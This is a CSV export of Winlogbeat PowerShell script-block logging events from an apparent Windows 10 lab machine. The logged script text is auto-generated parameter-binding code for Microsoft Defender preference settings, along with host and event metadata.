"Oct 23, 2022 @ 17:00:34.291",b3kSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.210",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (17 of 20):
meter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {
          [object]$__cmdletization_value = ${HighThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {
          [object]$__cmdletization_value = ${SevereThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {
          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PUAProtection')) {
          [object]$__cmdletization_value = ${PUAProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {
          [object]$__cmdletization_value = ${CloudBlockLevel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {
          [object]$__cmdletization_value = ${CloudExtendedTimeout}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {
          [object]$__cmdletization_value = ${EnableNetworkProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {
          [object]$__cmdletization_value = ${EnableControlledFolderAccess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {
          [object]$__cmdletization_value = ${EnableLowCpuPriority}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterTyp

ScriptBlock ID: f825ae19-44cf-4ba7-981f-597df47e6edc
Path: ","f825ae19-44cf-4ba7-981f-597df47e6edc","meter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {
          [object]$__cmdletization_value = ${HighThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {
          [object]$__cmdletization_value = ${SevereThreatDefaultAction}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {
          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PUAProtection')) {
          [object]$__cmdletization_value = ${PUAProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {
          [object]$__cmdletization_value = ${CloudBlockLevel}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {
          [object]$__cmdletization_value = ${CloudExtendedTimeout}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {
          [object]$__cmdletization_value = ${EnableNetworkProtection}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {
          [object]$__cmdletization_value = ${EnableControlledFolderAccess}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {
          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {
          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {
          [object]$__cmdletization_value = ${EnableLowCpuPriority}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterTyp",17,20,"-","-","-","-","-","-","-","-","-","-","-","S-1-5-21-504783269-3310020698-1149228630-1001","-","-","{1f14668e-e63b-0001-fad2-141f3be6d801}",wineventlog,"Microsoft-Windows-PowerShell/Operational",Ceo,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",4104,"-","-","-","-","-","-","On create calls","8,136","5,916","{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","Microsoft-Windows-PowerShell",3346,"Execute a Remote Command",CEO,"S-1-5-21-504783269-3310020698-1149228630-1001",vagrant,User,1
"Oct 23, 2022 @ 17:00:34.291",cHkSBIQByII7dpeEiBwm,".ds-winlogbeat-8.1.0-2022.10.09-000001","-","b241b85b-6d59-4af1-8abd-36244edf777f",Ceo,"8ffd9a40-1f45-4ea7-85d3-16afe67fd1b9",Ceo,winlogbeat,"8.1.0","1.12.0","Execute a Remote Command",process,4104,"Oct 23, 2022 @ 17:00:34.648","Oct 23, 2022 @ 17:00:34.211",event,"-","Microsoft-Windows-PowerShell",info,"-","-","-","-","-","-","-","-","x86_64",Ceo,"d371c2c9-8a38-4926-bf76-ce7844b816f5","fe80::3021:6235:9d79:b2fd, 192.168.200.11","08:00:27:b7:39:1a",Ceo,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",warning,"Creating Scriptblock text (18 of 20):
e = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {
          [object]$__cmdletization_value = ${EnableFileHashComputation}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {
          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {
          [object]$__cmdletization_value = ${ProxyPacUrl}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('ProxyServer')) {
          [object]$__cmdletization_value = ${ProxyServer}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
